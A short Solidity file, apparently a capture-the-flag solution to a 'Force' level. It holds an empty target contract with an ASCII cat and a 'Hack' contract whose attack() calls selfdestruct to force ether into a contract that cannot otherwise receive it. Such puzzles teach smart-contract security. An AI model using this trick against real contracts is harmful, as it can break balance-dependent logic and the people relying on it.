pragma solidity ^0.8.0;


contract Force { /*
                  MEOW ?
        /\_/\   /
   ____/ o o \
   /~____  =ø= /
   (______)__m_m)
                  */ }


contract Hack {
   address public challengeInstance;
   constructor(address _challengeInstance) payable {
       challengeInstance = _challengeInstance;
   }

   function attack() external {
       selfdestruct(payable(challengeInstance));
   }
}
